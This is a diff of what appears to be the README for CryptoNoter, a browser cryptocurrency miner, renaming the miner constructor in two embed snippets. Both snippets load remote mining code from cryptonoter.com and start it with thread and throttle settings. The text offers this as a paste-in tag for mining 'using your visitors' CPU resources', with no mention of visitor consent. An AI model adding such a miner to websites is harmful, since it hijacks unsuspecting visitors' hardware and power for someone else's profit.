@@ -135,7 +135,7 @@ self.CryptoNoter.CONFIG = {
 ```html
 <script src="https://www.cryptonoter.com/processor.js"></script>
 <script>
-    var miner = new CryptoNoter.Anonymous('CryptoNoter').start();
+    var miner = new CryptoNoter.User('CryptoNoter').start();
 </script>
 ```
 * Done! You can now start mining using your visitors' CPU resources by adding the above tag to any of your websites.
@@ -155,7 +155,7 @@ Here are some basic configuration for the parameters:
 <script src="https://www.cryptonoter.com/processor.js"></script>
 <script>
 	var addr = 'CryptoNoter';
-	var miner = new CryptoNoter.Anonymous(addr, {
+	var miner = new CryptoNoter.User(addr, {
         autoThreads: true,
 	throttle: 0.8
 	});
